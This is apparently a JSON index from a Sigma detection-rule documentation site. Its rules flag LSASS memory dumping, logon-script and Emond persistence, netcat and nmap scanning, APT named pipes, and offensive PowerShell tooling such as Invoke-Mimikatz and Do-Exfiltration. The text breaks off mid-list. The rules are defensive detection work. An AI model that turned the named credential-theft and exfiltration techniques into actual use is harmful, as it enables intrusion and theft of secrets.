Monitoring tools - Legitimate system administration level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_wmi_login.yml/","tags":["attack.execution","attack.t1047"],"title":"Login with WMI"},{"categories":null,"contents":"Detects when a Microsoft Cloud App Security reported when a user signs into your sanctioned apps from a risky IP address.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Logon from a Risky IP Address id: c191e2fa-f9d6-4ccf-82af-4f2aba08359f status: experimental description: Detects when a Microsoft Cloud App Security reported when a user signs into your sanctioned apps from a risky IP address. author: Austin Songer @austinsonger date: 2021/08/23 references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference logsource: category: ThreatManagement product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;Log on from a risky IP address\u0026#39; status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.initial_access - attack.t1078 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_logon_from_risky_ip_address.yml/","tags":["attack.initial_access","attack.t1078"],"title":"Logon from a Risky IP Address"},{"categories":null,"contents":"Detects creation or execution of UserInitMprLogonScript persistence method\nKnown false-positives exclude legitimate logon scripts penetration tests, red teaming References https://attack.mitre.org/techniques/T1037/ Raw rule (edit) title: Logon Scripts (UserInitMprLogonScript) Registry id: 9ace0707-b560-49b8-b6ca-5148b42f39fb status: test description: Detects creation or execution of UserInitMprLogonScript persistence method author: Tom Ueltschi (@c_APT_ure) references: - https://attack.mitre.org/techniques/T1037/ date: 2019/01/12 modified: 2021/11/27 logsource: category: registry_event product: windows detection: create_keywords_reg: TargetObject|contains: \u0026#39;UserInitMprLogonScript\u0026#39; condition: create_keywords_reg falsepositives: - exclude legitimate logon scripts - penetration tests, red teaming level: high tags: - attack.t1037.001 - attack.persistence - attack.lateral_movement ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_logon_scripts_userinitmprlogonscript_reg.yml/","tags":["attack.t1037.001","attack.persistence","attack.lateral_movement"],"title":"Logon Scripts (UserInitMprLogonScript) Registry"},{"categories":null,"contents":"Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up.\nKnown false-positives False positives are present when looking for 0x1410. Exclusions may be required. References https://blog.menasec.net/2019/02/threat-hunting-21-procdump-or-taskmgr.html https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md https://research.splunk.com/endpoint/windows_possible_credential_dumping/ Raw rule (edit) title: LSASS Memory Dump id: 5ef9853e-4d0e-4a70-846f-a9ca37d876da status: experimental description: Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up. author: Samir Bousseaden, Michael Haag date: 2019/04/03 modified: 2022/02/05 references: - https://blog.menasec.net/2019/02/threat-hunting-21-procdump-or-taskmgr.html - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md - https://research.splunk.com/endpoint/windows_possible_credential_dumping/ tags: - attack.credential_access - attack.t1003.001 - attack.s0002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; GrantedAccess|contains: #- \u0026#39;0x1fffff\u0026#39; # Too many false positives #- \u0026#39;0x01000\u0026#39; # Too many false positives #- \u0026#39;0x1010\u0026#39; # Too many false positives - \u0026#39;0x1038\u0026#39; - \u0026#39;0x40\u0026#39; #- \u0026#39;0x1400\u0026#39; # Too many false positives # - \u0026#39;0x1410\u0026#39; # Too many false positives - \u0026#39;0x1438\u0026#39; - \u0026#39;0x143a\u0026#39; CallTrace|contains: - \u0026#39;dbghelp.dll\u0026#39; - \u0026#39;dbgcore.dll\u0026#39; - \u0026#39;ntdll.dll\u0026#39; condition: selection falsepositives: - False positives are present when looking for 0x1410. Exclusions may be required. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_lsass_memdump.yml/","tags":["attack.credential_access","attack.t1003.001","attack.s0002"],"title":"LSASS Memory Dump"},{"categories":null,"contents":"LSASS memory dump creation using operating systems utilities. Procdump will use process name in output file if no name is specified\nKnown false-positives Dumping lsass memory for forensic investigation purposes by legitimate incident responder or forensic invetigator Dumps of another process that contains lsass in its process name (substring) References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment Raw rule (edit) title: LSASS Memory Dump File Creation id: 5e3d3601-0662-4af0-b1d2-36a05e90c40a description: LSASS memory dump creation using operating systems utilities. Procdump will use process name in output file if no name is specified author: Teymur Kheirkhabarov, oscd.community references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment date: 2019/10/22 modified: 2021/08/16 tags: - attack.credential_access - attack.t1003.001 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: \u0026#39;lsass\u0026#39; TargetFilename|endswith: \u0026#39;dmp\u0026#39; condition: selection fields: - ComputerName - TargetFilename falsepositives: - Dumping lsass memory for forensic investigation purposes by legitimate incident responder or forensic invetigator - Dumps of another process that contains lsass in its process name (substring) level: high status: experimental ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_lsass_memory_dump_file_creation.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"LSASS Memory Dump File Creation"},{"categories":null,"contents":"Detects adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass.\nKnown false-positives Unknown References https://twitter.com/shantanukhande/status/1229348874298388484 https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/ Raw rule (edit) title: Lsass Memory Dump via Comsvcs DLL id: a49fa4d5-11db-418c-8473-1e014a8dd462 description: Detects adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass. status: experimental date: 2020/10/20 modified: 2021/06/21 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.credential_access - attack.t1003.001 references: - https://twitter.com/shantanukhande/status/1229348874298388484 - https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/ logsource: category: process_access product: windows detection: selection: TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; SourceImage: \u0026#39;C:\\Windows\\System32\\rundll32.exe\u0026#39; CallTrace|contains: \u0026#39;comsvcs.dll\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"Lsass Memory Dump via Comsvcs DLL"},{"categories":null,"contents":"Detects additions to the Emond Launch Daemon that adversaries may use to gain persistence and elevate privileges.\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.014/T1546.014.md https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124 Raw rule (edit) title: MacOS Emond Launch Daemon id: 23c43900-e732-45a4-8354-63e4a6c187ce status: test description: Detects additions to the Emond Launch Daemon that adversaries may use to gain persistence and elevate privileges. author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.014/T1546.014.md - https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124 date: 2020/10/23 modified: 2021/11/27 logsource: category: file_event product: macos detection: selection_1: TargetFilename|contains: \u0026#39;/etc/emond.d/rules/\u0026#39; TargetFilename|endswith: \u0026#39;.plist\u0026#39; selection_2: TargetFilename|contains: \u0026#39;/private/var/db/emondClients/\u0026#39; condition: selection_1 or selection_2 falsepositives: - Legitimate administration activities level: medium tags: - attack.persistence - attack.privilege_escalation - attack.t1546.014 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/file_event/file_event_macos_emond_launch_daemon.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1546.014"],"title":"MacOS Emond Launch Daemon"},{"categories":null,"contents":"Detects enumeration of local or remote network services.\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md Raw rule (edit) title: MacOS Network Service Scanning id: 84bae5d4-b518-4ae0-b331-6d4afd34d00f status: test description: Detects enumeration of local or remote network services. author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md date: 2020/10/21 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection_1: Image|endswith: - \u0026#39;/nc\u0026#39; - \u0026#39;/netcat\u0026#39; selection_2: Image|endswith: - \u0026#39;/nmap\u0026#39; - \u0026#39;/telnet\u0026#39; filter: CommandLine|contains: \u0026#39;l\u0026#39; condition: (selection_1 and not filter) or selection_2 falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1046 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_network_service_scanning.yml/","tags":["attack.discovery","attack.t1046"],"title":"MacOS Network Service Scanning"},{"categories":null,"contents":"Detects the enumeration of other remote systems.\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md Raw rule (edit) title: Macos Remote System Discovery id: 10227522-8429-47e6-a301-f2b2d014e7ad status: test description: Detects the enumeration of other remote systems. author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md date: 2020/10/22 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection_1: Image|endswith: - \u0026#39;/arp\u0026#39; CommandLine|contains: - \u0026#39;-a\u0026#39; selection_2: Image|endswith: - \u0026#39;/ping\u0026#39; CommandLine|contains: - \u0026#39; 10.\u0026#39; #10.0.0.0/8 - \u0026#39; 192.168.\u0026#39; #192.168.0.0/16 - \u0026#39; 172.16.\u0026#39; #172.16.0.0/12 - \u0026#39; 172.17.\u0026#39; - \u0026#39; 172.18.\u0026#39; - \u0026#39; 172.19.\u0026#39; - \u0026#39; 172.20.\u0026#39; - \u0026#39; 172.21.\u0026#39; - \u0026#39; 172.22.\u0026#39; - \u0026#39; 172.23.\u0026#39; - \u0026#39; 172.24.\u0026#39; - \u0026#39; 172.25.\u0026#39; - \u0026#39; 172.26.\u0026#39; - \u0026#39; 172.27.\u0026#39; - \u0026#39; 172.28.\u0026#39; - \u0026#39; 172.29.\u0026#39; - \u0026#39; 172.30.\u0026#39; - \u0026#39; 172.31.\u0026#39; - \u0026#39; 127.\u0026#39; #127.0.0.0/8 - \u0026#39; 169.254.\u0026#39; #169.254.0.0/16 condition: 1 of selection* falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.t1018 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_remote_system_discovery.yml/","tags":["attack.discovery","attack.t1018"],"title":"Macos Remote System Discovery"},{"categories":null,"contents":"Detects execution of AppleScript of the macOS scripting language AppleScript.\nKnown false-positives Application installers might contain scripts as part of the installation process. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.002/T1059.002.md Raw rule (edit) title: MacOS Scripting Interpreter AppleScript id: 1bc2e6c5-0885-472b-bed6-be5ea8eace55 status: test description: Detects execution of AppleScript of the macOS scripting language AppleScript. author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.002/T1059.002.md date: 2020/10/21 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image|endswith: - \u0026#39;/osascript\u0026#39; CommandLine|contains|all: - \u0026#39;-e\u0026#39; condition: selection falsepositives: - Application installers might contain scripts as part of the installation process. level: medium tags: - attack.execution - attack.t1059.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_applescript.yml/","tags":["attack.execution","attack.t1059.002"],"title":"MacOS Scripting Interpreter AppleScript"},{"categories":null,"contents":"Detects the creation of a named pipe used by known APT malware\nKnown false-positives Unknown References https://securelist.com/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/71275/ https://securelist.com/faq-the-projectsauron-apt/75533/ https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf https://www.us-cert.gov/ncas/alerts/TA17-117A https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html https://thedfirreport.com/2020/06/21/snatch-ransomware/ https://github.com/RiccardoAncarani/LiquidSnake https://www.accenture.com/us-en/blogs/cyber-defense/turla-belugasturgeon-compromises-government-entity https://us-cert.cisa.gov/ncas/analysis-reports/ar19-304a https://download.bitdefender.com/resources/files/News/CaseStudies/study/115/Bitdefender-Whitepaper-PAC-A4-en-EN1.pdf https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/ Raw rule (edit) title: Malicious Named Pipe id: fe3ac066-98bb-432a-b1e7-a5229cb39d4a status: experimental description: Detects the creation of a named pipe used by known APT malware references: - https://securelist.com/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/71275/ - https://securelist.com/faq-the-projectsauron-apt/75533/ - https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf - https://www.us-cert.gov/ncas/alerts/TA17-117A - https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html - https://thedfirreport.com/2020/06/21/snatch-ransomware/ - https://github.com/RiccardoAncarani/LiquidSnake - https://www.accenture.com/us-en/blogs/cyber-defense/turla-belugasturgeon-compromises-government-entity - https://us-cert.cisa.gov/ncas/analysis-reports/ar19-304a - https://download.bitdefender.com/resources/files/News/CaseStudies/study/115/Bitdefender-Whitepaper-PAC-A4-en-EN1.pdf - https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/ date: 2017/11/06 modified: 2021/10/30 author: Florian Roth, blueteam0ps, elhoim logsource: product: windows category: pipe_created definition: \u0026#39;Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\u0026#39; detection: selection: PipeName: - \u0026#39;\\isapi_http\u0026#39; # Uroburos Malware - \u0026#39;\\isapi_dg\u0026#39; # Uroburos Malware - \u0026#39;\\isapi_dg2\u0026#39; # Uroburos Malware - \u0026#39;\\sdlrpc\u0026#39; # Cobra Trojan - \u0026#39;\\ahexec\u0026#39; # Sofacy group malware - \u0026#39;\\winsession\u0026#39; # Wild Neutron APT malware - \u0026#39;\\lsassw\u0026#39; # Wild Neutron APT malware - \u0026#39;\\46a676ab7f179e511e30dd2dc41bd388\u0026#39; # Project Sauron - \u0026#39;\\9f81f59bc58452127884ce513865ed20\u0026#39; # Project Sauron - \u0026#39;\\e710f28d59aa529d6792ca6ff0ca1b34\u0026#39; # Project Sauron - \u0026#39;\\rpchlp_3\u0026#39; # Project Sauron - \u0026#39;\\NamePipe_MoreWindows\u0026#39; # Cloud Hopper - RedLeaves - \u0026#39;\\pcheap_reuse\u0026#39; # Pipe used by Equation Group malware - \u0026#39;\\gruntsvc\u0026#39; # Covenant default # - \u0026#39;\\status_*\u0026#39; # CS default https://github.com/Neo23x0/sigma/issues/253 - \u0026#39;\\583da945-62af-10e8-4902-a8f205c72b2e\u0026#39; # SolarWinds SUNBURST malware - \u0026#39;\\bizkaz\u0026#39; # Snatch Ransomware - \u0026#39;\\svcctl\u0026#39; #Crackmapexec smbexec default - \u0026#39;\\Posh*\u0026#39; #PoshC2 default - \u0026#39;\\jaccdpqnvbrrxlaf\u0026#39; #PoshC2 default - \u0026#39;\\csexecsvc\u0026#39; #CSEXEC default - \u0026#39;\\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7\u0026#39; # LiquidSnake - \u0026#39;\\adschemerpc\u0026#39; # Turla HyperStack - \u0026#39;\\AnonymousPipe\u0026#39; # Hidden Cobra Hoplight - \u0026#39;\\bc367\u0026#39; # Pacifier - \u0026#39;\\bc31a7\u0026#39; # Pacifier - \u0026#39;\\testPipe\u0026#39; # Emissary Panda Hyperbro condition: selection tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/pipe_created/pipe_created_mal_namedpipes.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1055"],"title":"Malicious Named Pipe"},{"categories":null,"contents":"There is an option for a MS VS Just-In-Time Debugger \u0026ldquo;vsjitdebugger.exe\u0026rdquo; to launch specified executable and attach a debugger. This option may be used adversaries to execute malicious code by signed verified binary. The debugger is installed alongside with Microsoft Visual Studio package.\nKnown false-positives the process spawned by vsjitdebugger.exe is uncommon. References https://twitter.com/pabraeken/status/990758590020452353 https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Vsjitdebugger.yml https://docs.microsoft.com/en-us/visualstudio/debugger/debug-using-the-just-in-time-debugger?view=vs-2019 Raw rule (edit) title: Malicious PE Execution by Microsoft Visual Studio Debugger id: 15c7904e-6ad1-4a45-9b46-5fb25df37fd2 status: experimental description: There is an option for a MS VS Just-In-Time Debugger \u0026#34;vsjitdebugger.exe\u0026#34; to launch specified executable and attach a debugger. This option may be used adversaries to execute malicious code by signed verified binary. The debugger is installed alongside with Microsoft Visual Studio package. references: - https://twitter.com/pabraeken/status/990758590020452353 - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Vsjitdebugger.yml - https://docs.microsoft.com/en-us/visualstudio/debugger/debug-using-the-just-in-time-debugger?view=vs-2019 tags: - attack.t1218 - attack.defense_evasion author: Agro (@agro_sev), Ensar Şamil (@sblmsrsn), oscd.community date: 2020/10/14 modified: 2021/07/06 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\vsjitdebugger.exe\u0026#39; reduction1: Image|endswith: \u0026#39;\\vsimmersiveactivatehelper*.exe\u0026#39; reduction2: Image|endswith: \u0026#39;\\devenv.exe\u0026#39; condition: selection and not (reduction1 or reduction2) falsepositives: - the process spawned by vsjitdebugger.exe is uncommon. level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_use_of_vsjitdebugger_bin.yml/","tags":["attack.t1218","attack.defense_evasion"],"title":"Malicious PE Execution by Microsoft Visual Studio Debugger"},{"categories":null,"contents":"Detects the creation of known powershell scripts for exploitation\nKnown false-positives Penetration Tests References https://raw.githubusercontent.com/Neo23x0/sigma/f35c50049fa896dff91ff545cb199319172701e8/rules/windows/powershell/powershell_malicious_commandlets.yml Raw rule (edit) title: Malicious PowerShell Commandlet Names id: f331aa1f-8c53-4fc3-b083-cc159bc971cb status: test description: Detects the creation of known powershell scripts for exploitation author: Markus Neis references: - https://raw.githubusercontent.com/Neo23x0/sigma/f35c50049fa896dff91ff545cb199319172701e8/rules/windows/powershell/powershell_malicious_commandlets.yml date: 2018/04/07 modified: 2021/11/27 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: - \u0026#39;\\Invoke-DllInjection.ps1\u0026#39; - \u0026#39;\\Invoke-WmiCommand.ps1\u0026#39; - \u0026#39;\\Get-GPPPassword.ps1\u0026#39; - \u0026#39;\\Get-Keystrokes.ps1\u0026#39; - \u0026#39;\\Get-VaultCredential.ps1\u0026#39; - \u0026#39;\\Invoke-CredentialInjection.ps1\u0026#39; - \u0026#39;\\Invoke-Mimikatz.ps1\u0026#39; - \u0026#39;\\Invoke-NinjaCopy.ps1\u0026#39; - \u0026#39;\\Invoke-TokenManipulation.ps1\u0026#39; - \u0026#39;\\Out-Minidump.ps1\u0026#39; - \u0026#39;\\VolumeShadowCopyTools.ps1\u0026#39; - \u0026#39;\\Invoke-ReflectivePEInjection.ps1\u0026#39; - \u0026#39;\\Get-TimedScreenshot.ps1\u0026#39; - \u0026#39;\\Invoke-UserHunter.ps1\u0026#39; - \u0026#39;\\Find-GPOLocation.ps1\u0026#39; - \u0026#39;\\Invoke-ACLScanner.ps1\u0026#39; - \u0026#39;\\Invoke-DowngradeAccount.ps1\u0026#39; - \u0026#39;\\Get-ServiceUnquoted.ps1\u0026#39; - \u0026#39;\\Get-ServiceFilePermission.ps1\u0026#39; - \u0026#39;\\Get-ServicePermission.ps1\u0026#39; - \u0026#39;\\Invoke-ServiceAbuse.ps1\u0026#39; - \u0026#39;\\Install-ServiceBinary.ps1\u0026#39; - \u0026#39;\\Get-RegAutoLogon.ps1\u0026#39; - \u0026#39;\\Get-VulnAutoRun.ps1\u0026#39; - \u0026#39;\\Get-VulnSchTask.ps1\u0026#39; - \u0026#39;\\Get-UnattendedInstallFile.ps1\u0026#39; - \u0026#39;\\Get-WebConfig.ps1\u0026#39; - \u0026#39;\\Get-ApplicationHost.ps1\u0026#39; - \u0026#39;\\Get-RegAlwaysInstallElevated.ps1\u0026#39; - \u0026#39;\\Get-Unconstrained.ps1\u0026#39; - \u0026#39;\\Add-RegBackdoor.ps1\u0026#39; - \u0026#39;\\Add-ScrnSaveBackdoor.ps1\u0026#39; - \u0026#39;\\Gupt-Backdoor.ps1\u0026#39; - \u0026#39;\\Invoke-ADSBackdoor.ps1\u0026#39; - \u0026#39;\\Enabled-DuplicateToken.ps1\u0026#39; - \u0026#39;\\Invoke-PsUaCme.ps1\u0026#39; - \u0026#39;\\Remove-Update.ps1\u0026#39; - \u0026#39;\\Check-VM.ps1\u0026#39; - \u0026#39;\\Get-LSASecret.ps1\u0026#39; - \u0026#39;\\Get-PassHashes.ps1\u0026#39; - \u0026#39;\\Show-TargetScreen.ps1\u0026#39; - \u0026#39;\\Port-Scan.ps1\u0026#39; - \u0026#39;\\Invoke-PoshRatHttp.ps1\u0026#39; - \u0026#39;\\Invoke-PowerShellTCP.ps1\u0026#39; - \u0026#39;\\Invoke-PowerShellWMI.ps1\u0026#39; - \u0026#39;\\Add-Exfiltration.ps1\u0026#39; - \u0026#39;\\Add-Persistence.ps1\u0026#39; - \u0026#39;\\Do-Exfiltration.ps1\u0026#39; - \u0026#39;\\Start-CaptureServer.ps1\u0026#39; - \u0026#39;\\Invoke-ShellCode.ps1\u0026#39; - \u0026#39;\\Get-ChromeDump.ps1\u0026#39; - \u0026#39;\\Get-ClipboardContents.ps1\u0026#39; - \u0026#39;\\Get-FoxDump.ps1\u0026#39; - \u0026#39;\\Get-IndexedItem.ps1\u0026#39; - \u0026#39;\\Get-Screenshot.ps1\u0026#39; - \u0026#39;\\Invoke-Inveigh.ps1\u0026#39; - \u0026#39;\\Invoke-NetRipper.ps1\u0026#39; - \u0026#39;\\Invoke-EgressCheck.ps1\u0026#39; - \u0026#39;\\Invoke-PostExfil.ps1\u0026#39; - \u0026#39;\\Invoke-PSInject.ps1\u0026#39; - \u0026#39;\\Invoke-RunAs.ps1\u0026#39; - \u0026#39;\\MailRaider.ps1\u0026#39; - \u0026#39;\\New-HoneyHash.ps1\u0026#39; - \u0026#39;\\Set-MacAttribute.ps1\u0026#39; - \u0026#39;\\Invoke-DCSync.ps1\u0026#39; - \u0026#39;\\Invoke-PowerDump.ps1\u0026#39; - \u0026#39;\\Exploit-Jboss.ps1\u0026#39; - \u0026#39;\\Invoke-ThunderStruck.ps1\u0026#39; - \u0026#39;\\Invoke-VoiceTroll.ps1\u0026#39; - \u0026#39;\\Set-Wallpaper.ps1\u0026#39; - \u0026#39;\\Invoke-InveighRelay.ps1\u0026#39; - \u0026#39;\\Invoke-PsExec.ps1\u0026#39; - \u0026#39;\\Invoke-SSHCommand.ps1\u0026#39; - \u0026#39;\\Get-SecurityPackages.ps1\u0026#39; - \u0026#39;\\Install-SSP.ps1\u0026#39; - \u0026#39;\\Invoke-BackdoorLNK.ps1\u0026#39; - \u0026#39;\\PowerBreach.ps1\u0026#39; - \u0026#39;\\Get-SiteListPassword.ps1\u0026#39; - \u0026#39;\\Get-System.ps1\u0026#39; - \u0026#39;\\Invoke-BypassUAC.ps1\u0026#39; - \u0026#39;\\Invoke-Tater.ps1\u0026#39; - \u0026#39;\\Invoke-WScriptBypassUAC.ps1\u0026#39; - \u0026#39;\\PowerUp.ps1\u0026#39; - \u0026#39;\\PowerView.ps1\u0026#39; - \u0026#39;\\Get-RickAstley.ps1\u0026#39; - \u0026#39;\\Find-Fruit.ps1\u0026#39; - \u0026#39;\\HTTP-Login.ps1\u0026#39; - \u0026#39;\\Find-TrustedDocuments.ps1\u0026#39; - \u0026#39;\\Invoke-Paranoia.ps1\u0026#39; - \u0026#39;\\Invoke-WinEnum.ps1\u0026#39; - \u0026#39;\\Invoke-ARPScan.ps1\u0026#39; - \u0026#39;\\Invoke-PortScan.ps1\u0026#39; - \u0026#39;\\Invoke-ReverseDNSLookup.ps1\u0026#39; - \u0026#39;\\Invoke-SMBScanner.ps1\u0026#39; - \u0026#39;\\Invoke-Mimikittenz.ps1\u0026#39; condition: selection falsepositives: - Penetration Tests level: high tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_powershell_exploit_scripts.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Malicious PowerShell Commandlet Names"},{"categories":null,"contents":"Detects Commandlet names from well-known PowerShell exploitation frameworks\nKnown false-positives Penetration testing References https://adsecurity.org/?p=2921 Raw rule (edit) title: Malicious PowerShell Commandlets id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6 status: experimental description: Detects Commandlet names from well-known PowerShell exploitation frameworks references: - https://adsecurity.org/?p=2921 tags: - attack.execution - attack.t1059.001 author: Sean Metcalf (source), Florian Roth (rule), Bartlomiej Czyz @bczyz1 (update), oscd.community (update) date: 2017/03/05 modified: 2021/11/29 logsource: product: windows category: ps_script definition: Script Block Logging must be enable detection: select_Malicious: ScriptBlockText|contains: - \u0026#39;Invoke-DllInjection\u0026#39; - \u0026#39;Invoke-Shellcode\u0026#39; - \u0026#39;Invoke-WmiCommand\u0026#39; - \u0026#39;Get-GPPPassword\u0026#39; - \u0026#39;Get-Keystrokes\u0026#39; - \u0026#39;Get-TimedScreenshot\u0026#39; - \u0026#39;Get-VaultCredential\u0026#39; - \u0026#39;Invoke-CredentialInjection\u0026#39; - \u0026#39;Invoke-Mimikatz\u0026#39; - \u0026#39;Invoke-NinjaCopy\u0026#39; - \u0026#39;Invoke-TokenManipulation\u0026#39; - \u0026#39;Out-Minidump\u0026#39; - \u0026#39;VolumeShadowCopyTools\u0026#39; - \u0026#39;Invoke-ReflectivePEInjection\u0026#39; - \u0026#39;Invoke-UserHunter\u0026#39; - \u0026#39;Find-GPOLocation\u0026#39; - \u0026#39;Invoke-ACLScanner\u0026#39; - \u0026#39;Invoke-DowngradeAccount\u0026#39; - \u0026#39;Get-ServiceUnquoted\u0026#39; - \u0026#39;Get-ServiceFilePermission\u0026#39; - \u0026#39;Get-ServicePermission\u0026#39; - \u0026#39;Invoke-ServiceAbuse\u0026#39; - \u0026#39;Install-ServiceBinary\u0026#39; - \u0026#39;Get-RegAutoLogon\u0026#39; - \u0026#39;Get-VulnAutoRun\u0026#39; - \u0026#39;Get-VulnSchTask\u0026#39; - \u0026#39;Get-UnattendedInstallFile\u0026#39; - \u0026#39;Get-ApplicationHost\u0026#39; - \u0026#39;Get-RegAlwaysInstallElevated\u0026#39; - \u0026#39;Get-Unconstrained\u0026#39; - \u0026#39;Add-RegBackdoor\u0026#39; - \u0026#39;Add-ScrnSaveBackdoor\u0026#39; - \u0026#39;Gupt-Backdoor\u0026#39; - \u0026#39;Invoke-ADSBackdoor\u0026#39; - \u0026#39;Enabled-DuplicateToken\u0026#39; - \u0026#39;Invoke-PsUaCme\u0026#39; - \u0026#39;Remove-Update\u0026#39; - \u0026#39;Check-VM\u0026#39; - \u0026#39;Get-LSASecret\u0026#39; - \u0026#39;Get-PassHashes\u0026#39; - \u0026#39;Show-TargetScreen\u0026#39; - \u0026#39;Port-Scan\u0026#39; - \u0026#39;Invoke-PoshRatHttp\u0026#39; - \u0026#39;Invoke-PowerShellTCP\u0026#39; - \u0026#39;Invoke-PowerShellWMI\u0026#39; - \u0026#39;Add-Exfiltration\u0026#39; - \u0026#39;Add-Persistence\u0026#39; - \u0026#39;Do-Exfiltration\u0026#39; - \u0026#39;Start-CaptureServer\u0026#39; - \u0026#39;Get-ChromeDump\u0026#39; - \u0026#39;Get-ClipboardContents\u0026#39; - \u0026#39;Get-FoxDump\u0026#39; - \u0026#39;Get-IndexedItem\u0026#39; - \u0026#39;Get-Screenshot\u0026#39; - \u0026#39;Invoke-Inveigh\u0026#39; - \u0026#39;Invoke-NetRipper\u0026#39; - \u0026#39;Invoke-EgressCheck\u0026#39; - \u0026#39;Invoke-PostExfil\u0026#39; - \u0026#39;Invoke-PSInject\u0026#39; - \u0026#39;Invoke-RunAs\u0026#39; - \u0026#39;MailRaider\u0026#39; - \u0026#39;New-HoneyHash\u0026#39; - 